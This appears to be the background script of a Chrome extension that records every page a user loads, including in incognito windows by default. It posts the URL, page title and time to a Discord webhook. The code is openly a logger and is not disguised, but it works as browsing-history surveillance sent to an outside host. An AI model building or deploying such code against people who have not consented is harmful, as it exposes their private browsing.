import { WEBHOOK_URL } from './config.js';

// Default settings
let settings = {
  normalMode: true,
  incognitoMode: true,
  browserInfo: true,
  timestamp: true,
  pageTitle: true,
  isEnabled: true
};

// Keep track of recently sent URLs to prevent duplicates
const recentUrls = new Map();

// Load settings when extension starts
chrome.storage.local.get(settings, (result) => {
  settings = { ...settings, ...result };  // Merge with defaults
});

// Listen for settings changes
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'settingsUpdated') {
    settings = { ...settings, ...message.settings };  // Merge with existing settings
    sendToDiscord("⚙️ Settings Updated", "log");
  }
});

// Function to check if URL was recently sent
function wasRecentlySent(url) {
  const now = Date.now();
  const lastSent = recentUrls.get(url);
  
  // Remove old entries
  for (const [oldUrl, timestamp] of recentUrls.entries()) {
    if (now - timestamp > 2000) { // 2 seconds
      recentUrls.delete(oldUrl);
    }
  }
  
  if (lastSent && (now - lastSent) < 2000) { // Within 2 seconds
    return true;
  }
  
  recentUrls.set(url, now);
  return false;
}

// Main URL logging listener
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  try {
    // Only proceed if the tab has completed loading and has a URL
    if (changeInfo.status !== 'complete' || !tab.url) return;
    
    // Skip browser internal pages
    if (tab.url.startsWith('chrome://') || tab.url.startsWith('edge://')) return;
    
    // Get full tab info
    const tabInfo = await chrome.tabs.get(tabId);
    
    // Check if logging is enabled for this window type
    const shouldLog = (tabInfo.incognito && settings.incognitoMode) || 
                     (!tabInfo.incognito && settings.normalMode);
    
    if (shouldLog && !wasRecentlySent(tab.url)) {
      await logUrl(tab, tabInfo.incognito);
    }
  } catch (error) {
    console.error('Error in tab update listener:', error);
    sendToDiscord(`❌ Tab Update Error: ${error.message}`, "error");
  }
});

async function logUrl(tab, isIncognito) {
  try {
    let message = `🔗 ${tab.url}`;
    
    if (settings.pageTitle && tab.title) {
      message += `\n📑 ${tab.title}`;
    }
    
    if (settings.timestamp) {
      message += `\n⏰ ${new Date().toLocaleTimeString()}`;
    }
    
    if (settings.browserInfo) {
      message += `\n${isIncognito ? '🕶️ Incognito' : '🌍 Normal'}`;
    }

    await sendToDiscord(message, "url");
  } catch (error) {
    console.error('Error in logUrl:', error);
    sendToDiscord(`❌ Log Error: ${error.message}`, "error");
  }
}

async function sendToDiscord(message, type = "url") {
  try {
    const prefix = {
      error: "🚨",
      log: "📋",
      url: "🌐"
    }[type];

    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        content: `${prefix} ${message}`
      })
    });
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
  } catch (error) {
    console.error('💢 Discord Error:', error);
  }
} 